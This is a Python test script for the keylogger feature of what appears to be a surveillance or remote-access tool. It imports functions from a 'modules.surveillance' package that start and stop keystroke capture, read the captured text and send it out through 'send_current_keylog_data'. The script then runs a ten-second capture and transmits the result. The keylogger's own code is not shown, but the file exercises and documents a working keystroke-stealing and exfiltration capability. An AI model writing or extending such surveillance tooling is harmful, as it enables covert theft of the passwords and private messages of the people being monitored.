#!/usr/bin/env python3
"""
Test script for keylogger functionality
"""

import sys
import time
from pathlib import Path

# Add the modules directory to Python path
current_dir = Path(__file__).parent
modules_dir = current_dir / "modules"
if str(modules_dir) not in sys.path:
    sys.path.insert(0, str(modules_dir))

def test_keylogger():
    """Test the keylogger functionality"""
    print("⌨️ Testing Keylogger Functionality")
    print("=" * 50)
    
    try:
        from modules.surveillance import (
            start_keylogger, 
            stop_keylogger, 
            is_keylogger_running, 
            get_current_keylogger_text,
            send_current_keylog_data
        )
        
        print("✅ All keylogger functions imported successfully")
        
        # Test 1: Check initial state
        print(f"\n📊 Initial state: Keylogger running = {is_keylogger_running()}")
        
        # Test 2: Start keylogger
        print("\n🚀 Starting keylogger...")
        result = start_keylogger()
        print(f"   Result: {result}")
        
        if result.get('status') == 'success':
            print("✅ Keylogger started successfully")
            
            # Test 3: Check if running
            print(f"\n📊 Keylogger status: {is_keylogger_running()}")
            
            # Test 4: Wait for some input
            print("\n⌨️ Type some text for 10 seconds to test capture...")
            print("   (The keylogger will capture your keystrokes)")
            
            for i in range(10, 0, -1):
                print(f"   Time remaining: {i} seconds", end='\r')
                time.sleep(1)
            print("\n")
            
            # Test 5: Get current text
            print("\n📝 Getting current keylog text...")
            current_text = get_current_keylogger_text()
            print(f"   Result: {current_text}")
            
            # Test 6: Send current data
            print("\n📤 Sending current keylog data...")
            send_result = send_current_keylog_data()
            print(f"   Result: {send_result}")
            
            # Test 7: Stop keylogger
            print("\n🛑 Stopping keylogger...")
            stop_result = stop_keylogger()
            print(f"   Result: {stop_result}")
            
            # Test 8: Final status
            print(f"\n📊 Final status: Keylogger running = {is_keylogger_running()}")
            
        else:
            print(f"❌ Failed to start keylogger: {result}")
            
    except ImportError as e:
        print(f"❌ Import error: {e}")
        print("Make sure the surveillance module is in the modules directory")
    except Exception as e:
        print(f"❌ Test failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    test_keylogger()
